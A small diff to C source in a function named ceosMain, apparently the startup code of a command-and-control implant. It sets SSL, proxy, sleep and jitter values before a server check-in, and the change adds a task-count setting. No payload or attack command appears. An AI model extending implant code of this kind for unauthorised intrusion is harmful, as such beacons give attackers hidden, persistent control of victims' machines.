@@ -19,9 +19,12 @@ VOID ceosMain()
     ceosConfig->isSSL = ssl;
     ceosConfig->isProxyEnabled = proxyenabled;
     ceosConfig->proxyURL = (PWCHAR)proxyurl;
+
     // Convert the sleeptime from seconds to miliseconds
     ceosConfig->sleeptime_ms = 1000 * sleep_time;
     ceosConfig->jitter = jitter_perc;
+
+    ceosConfig->numTasks = num_tasks;
 
     PParser ResponseParser = checkin();
     parseCheckin(ResponseParser);
